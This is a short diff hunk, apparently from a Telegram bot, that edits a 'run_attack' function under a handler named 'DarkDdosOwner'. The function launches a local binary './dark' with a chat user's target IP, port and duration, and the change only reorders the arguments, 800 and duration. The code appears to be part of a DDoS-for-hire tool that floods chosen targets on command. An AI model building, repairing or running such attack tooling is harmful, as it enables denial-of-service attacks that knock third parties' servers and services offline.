@@ -166,7 +166,7 @@ async def DarkDdosOwner(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./dark {ip} {port} {duration} 800",
+            f"./dark {ip} {port} {800} {duration}",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
